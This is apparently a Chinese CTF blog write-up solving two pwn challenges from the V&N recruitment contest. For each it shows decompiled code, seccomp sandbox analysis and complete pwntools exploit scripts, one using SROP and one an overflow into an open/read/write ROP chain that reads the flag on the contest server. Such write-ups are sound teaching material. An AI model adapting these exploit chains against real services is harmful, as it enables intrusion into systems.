---
title: V&N招新赛pwn
date: 2020-02-29 23:47:47
tags: pwn
---
周六做了一下V&N招新赛，难顶，不愧是V&N,不愧是南梦，我不配<!--more-->  
![](bqb.jpg)
## 0x01 babybabypwn  
这题是SROP。  
查看保护  
```shell  
[*] '/home/N0vice/Desktop/BUUCTF/VN/vn_pwn_babybabypwn_1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```    
保护全开  
main函数里调用了三个函数  
```C  
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_11B5(a1, a2, a3);
  sub_1202();
  sub_1347();
  return 0LL;
}
```    
第一个函数就是常规的设置缓冲区什么的,就不贴了  
第二个函数是一些沙箱保护机制，也就是禁用了一些函数     
```C  
__int64 sub_1202()
{
  __int64 v0; // ST08_8

  v0 = seccomp_init(2147418112LL);
  seccomp_rule_add(v0, 0LL, 41LL, 0LL);
  seccomp_rule_add(v0, 0LL, 42LL, 0LL);
  seccomp_rule_add(v0, 0LL, 49LL, 0LL);
  seccomp_rule_add(v0, 0LL, 50LL, 0LL);
  seccomp_rule_add(v0, 0LL, 56LL, 0LL);
  seccomp_rule_add(v0, 0LL, 59LL, 0LL);
  seccomp_rule_add(v0, 0LL, 10LL, 0LL);
  seccomp_rule_add(v0, 0LL, 9LL, 0LL);
  seccomp_rule_add(v0, 0LL, 57LL, 0LL);
  return seccomp_load(v0);
}
```    
主要函数在这里  
```C  
unsigned __int64 sub_1347()
{
  char buf; // [rsp+0h] [rbp-110h]
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Welcome to v&n challange!");
  printf("Here is my gift: 0x%llx\n", &puts);
  printf("Please input magic message: ");
  read(0, &buf, 0x100uLL);
  syscall(15LL, &buf);
  return __readfsqword(0x28u) ^ v2;
}
```    
一开始就给了puts函数的真实地址，而且题目还说了是16的环境，给了libc。这里没有溢出，但是有一个syscall，参数是15，查了一下15是rt_sigreturn函数的系统调用号，rt_sigreturn函数对应的就是SROP的手段了。只好现学了一下SROP……   
通过seccomp-tools查看禁用了那些函数  
![](VN1.png)   
会发现禁用了execve函数和mprotect函数，那只能orw了      
思路如下：先接收puts函数的地址，然后计算得出libc基地址libc_base，通过pwntools的SROP利用的相应模块将对应寄存器设置好参数，然后可以直接调用read函数，调用read函数之后直接orw打过去。这里提一下，因为程序开启了pie保护，所以程序中的所有找到的gadget都不能用，用ROPgadget找到的全都不是真实地址，都是一个偏移  
exp如下:
```python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
context.arch = 'amd64'
p=remote("node3.buuoj.cn",29463)
#p = process("./vn_pwn_babybabypwn_1")
elf = ELF("./vn_pwn_babybabypwn_1")
libc = ELF("libc-2.23_x64.so")
stack_addr = libc.sym['environ']
p.recvuntil("0x")
puts_addr = int(p.recvline(),16)
libc_base = puts_addr - libc.sym['puts']
log.success("libc_base==>" + hex(libc_base))
libc.address = libc_base
stack_addr = libc.sym['environ']
pop_rdi_ret = 0x0000000000021102 + libc_base
pop_rdx_rsi = 0x00000000001150c9 + libc_base
pop_rdx_ret = 0x0000000000001b92 + libc_base
syscall_addr = 0x00000000000bc375 + libc_base
frame = SigreturnFrame()   # pwntools提供了Sigreturn Frame的构建
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x200
frame.rsp = stack_addr + 8
frame.rip = syscall_addr
#gdb.attach(p)
payload = str(frame)[8:]
p.send(payload)

orw = "flag" + "\x00"*4 + p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(0) + p64(0) + p64(libc.symbols['open'])
orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr) + p64(libc.symbols['read'])
orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr) + p64(libc.symbols['write'])

p.send(orw)
p.interactive()
```    
设置rsp加8的原因是需要将flag字符串的位置留出来，发送过去的frame通过gdb调试可得，前八个是调用rt_sigreturn函数的，但是由于题中的系统调用号已经是15了，所以前8个去掉  
</br>  
## 0x02  warm_up  
这题和前面那题一开始的回显一模一样，一度怀疑做了两道一样的题    
检查保护   
```shell  
[*] '/home/N0vice/Desktop/BUUCTF/VN/vn_pwn_warmup'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```  
除了canary以外的都开了  
main函数  
```C  
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_80A();
  puts("This is a easy challange for you.");
  printf("Here is my gift: 0x%llx\n", &puts);
  sub_84D();
  sub_9D3();
  return 0LL;
}
```   
第一个照例是setbuf啥的不贴了  
第二个函数  
```C  
int sub_84D()
{
  __int16 v1; // [rsp+0h] [rbp-70h]
  __int16 *v2; // [rsp+8h] [rbp-68h]
  __int16 v3; // [rsp+10h] [rbp-60h]
  char v4; // [rsp+12h] [rbp-5Eh]
  char v5; // [rsp+13h] [rbp-5Dh]
  int v6; // [rsp+14h] [rbp-5Ch]
  __int16 v7; // [rsp+18h] [rbp-58h]
  char v8; // [rsp+1Ah] [rbp-56h]
  char v9; // [rsp+1Bh] [rbp-55h]
  int v10; // [rsp+1Ch] [rbp-54h]
  char v11; // [rsp+22h] [rbp-4Eh]
  char v12; // [rsp+23h] [rbp-4Dh]
  int v13; // [rsp+24h] [rbp-4Ch]
  __int16 v14; // [rsp+28h] [rbp-48h]
  char v15; // [rsp+2Ah] [rbp-46h]
  char v16; // [rsp+2Bh] [rbp-45h]
  int v17; // [rsp+2Ch] [rbp-44h]
  __int16 v18; // [rsp+30h] [rbp-40h]
  char v19; // [rsp+32h] [rbp-3Eh]
  char v20; // [rsp+33h] [rbp-3Dh]
  int v21; // [rsp+34h] [rbp-3Ch]
  __int16 v22; // [rsp+38h] [rbp-38h]
  char v23; // [rsp+3Ah] [rbp-36h]
  char v24; // [rsp+3Bh] [rbp-35h]
  int v25; // [rsp+3Ch] [rbp-34h]
  __int16 v26; // [rsp+40h] [rbp-30h]
  char v27; // [rsp+42h] [rbp-2Eh]
  char v28; // [rsp+43h] [rbp-2Dh]
  int v29; // [rsp+44h] [rbp-2Ch]
  __int16 v30; // [rsp+48h] [rbp-28h]
  char v31; // [rsp+4Ah] [rbp-26h]
  char v32; // [rsp+4Bh] [rbp-25h]
  int v33; // [rsp+4Ch] [rbp-24h]
  __int16 v34; // [rsp+50h] [rbp-20h]
  char v35; // [rsp+52h] [rbp-1Eh]
  char v36; // [rsp+53h] [rbp-1Dh]
  int v37; // [rsp+54h] [rbp-1Ch]
  __int16 v38; // [rsp+58h] [rbp-18h]
  char v39; // [rsp+5Ah] [rbp-16h]
  char v40; // [rsp+5Bh] [rbp-15h]
  int v41; // [rsp+5Ch] [rbp-14h]
  __int16 v42; // [rsp+60h] [rbp-10h]
  char v43; // [rsp+62h] [rbp-Eh]
  char v44; // [rsp+63h] [rbp-Dh]
  int v45; // [rsp+64h] [rbp-Ch]
  char v46; // [rsp+6Ah] [rbp-6h]
  char v47; // [rsp+6Bh] [rbp-5h]
  int v48; // [rsp+6Ch] [rbp-4h]

  prctl(38, 1LL, 0LL, 0LL, 0LL);
  v3 = 32;
  v4 = 0;
  v5 = 0;
  v6 = 4;
  v7 = 21;
  v8 = 0;
  v9 = 9;
  v10 = -1073741762;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 53;
  v15 = 7;
  v16 = 0;
  v17 = 0x40000000;
  v18 = 21;
  v19 = 6;
  v20 = 0;
  v21 = 59;
  v22 = 21;
  v23 = 0;
  v24 = 4;
  v25 = 1;
  v26 = 32;
  v27 = 0;
  v28 = 0;
  v29 = 36;
  v30 = 21;
  v31 = 0;
  v32 = 2;
  v33 = 0;
  v34 = 32;
  v35 = 0;
  v36 = 0;
  v37 = 32;
  v38 = 21;
  v39 = 1;
  v40 = 0;
  v41 = 16;
  v42 = 6;
  v43 = 0;
  v44 = 0;
  v45 = 2147418112;
  v46 = 0;
  v47 = 0;
  v48 = 0;
  v1 = 12;
  v2 = &v3;
  return prctl(22, 2LL, &v1, *&v1, &v3, *&v3, *&v7, 32LL, *&v14, *&v18, *&v22, *&v26, *&v30, *&v34, *&v38, *&v42, 6LL);
}
```   
这个函数也把execve禁用了  
![](VN2.png)    
那还是只能orw一把梭了  
在第二次输入的时候结尾加一个pop_rdi_ret，gdb跟一下会发现将第一次输入的内容pop到rdi中了，可知两个栈是相连的，执行完下面的就会继续执行第一次输入的  
![](warm_up1.png)  
那我们布置好参数调用一次read将flag字符串读到一个可写的区域，然后orw打过去就行
exp:  
```python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
context.arch = 'amd64'
p=remote("node3.buuoj.cn",27383)
#p = process("./vn_pwn_warmup")
elf = ELF("./vn_pwn_warmup")
libc = ELF("libc-2.23_x64.so")
lib = process("libc-2.23_x64.so")
sleep(0.1)
p.recvuntil("0x")
puts_addr = int(p.recvline(),16)
libc_base = puts_addr - libc.sym['puts']
log.success("libc_base==>" + hex(libc_base))
libc.address = libc_base
pop_rdi_ret = 0x0000000000021102+libc_base
pop_rdx_rsi = 0x00000000001150c9+libc_base
ret = 0x0000000000000937 + libc_base
stack_addr = libc.sym['environ']  # environ是libc存储的栈地址
#gdb.attach(p)
payload = p64(0) + p64(pop_rdx_rsi) + p64(0x8) + p64(stack_addr) + p64(libc.sym['read'])  #调用read函数，第一个参数写在了第二次输入的最后
payload += p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(0)*2 + p64(libc.sym['open'])
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr+8) + p64(libc.symbols['read'])
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr+8) + p64(libc.symbols['write'])
payload += "a"*(0x180-len(payload))
#gdb.attach(p)
p.send(payload)
sleep(0.1)

payload = "a"*0x78 + p64(pop_rdi_ret)
p.recvuntil("name?")
p.send(payload)
p.send("flag\x00\x00\x00\x00")
p.interactive()
```  
参考链接:  
https://www.freebuf.com/articles/network/87447.html (SROP学习)  
https://www.jianshu.com/p/ca4a5dacd1a2  
https://www.cnblogs.com/junmoxiao/p/6741642.html  